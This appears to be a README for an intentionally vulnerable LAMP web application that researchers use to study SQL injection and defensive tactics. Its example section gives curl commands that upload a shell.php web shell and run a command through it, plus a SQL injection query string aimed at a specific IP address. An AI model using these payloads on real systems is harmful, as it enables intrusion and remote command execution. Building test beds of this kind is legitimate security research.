# Web Server

## Requirements

For example, the exemplar assumes SQL injection is possible on the vendor web portal, **the web application where the contractor can submit invoices to the enterprise**. Additionally, the exemplar assumes a misconfiguration of the SQL server; in this example, **the SQL server is a Microsoft SQL server running with administrator privileges and has PowerShell enabled, allowing for command line interaction with the server.** The SQL injection will have a different level of observability and different set of defense tactics than network reconnaissance. This enables researchers to explore strategies such as focusing defensive tactics on increasing attack observability.

### To-Do List

- [ ] test new sql file
- [ ] set password in the insertion of data
- [ ] test display
- [ ] test sql injection
- [ ] automate sql injection
- [ ] all done!

### LAMP

- Linux
- Apache Web Server
- MySQL Database Server
- PHP: backend programming language

### Database

#### Table&Column

- user
- user_group
- target_order

### Web Pages

- [login/register](https://www.tutorialspoint.com/php/php_mysql_login.htm)
- welcome
- search
- user profile(for photo uploading)



## SQL injections example

#### 1. Shell Injection

```shell
$ curl -F "image=@path/shell.php" http://IP_address/upload.php
$ curl -X GET  http://IP_address/images/shell.php\?cmd\=uname
```

#### 2. SQL Injection 




```shell
input query string: `anything%' OR 'x' LIKE '%x`
$ curl -X GET  http://52.37.128.197/index.php?query=anything%25%27+OR+%27x%27+LIKE+%27%25x
```



## Extensibility

1. Create your own database using your sql file
2. Modify the PHP source files, including functions and the level of security 



## References

[SQL injection](http://php.net/manual/en/security.database.sql-injection.php)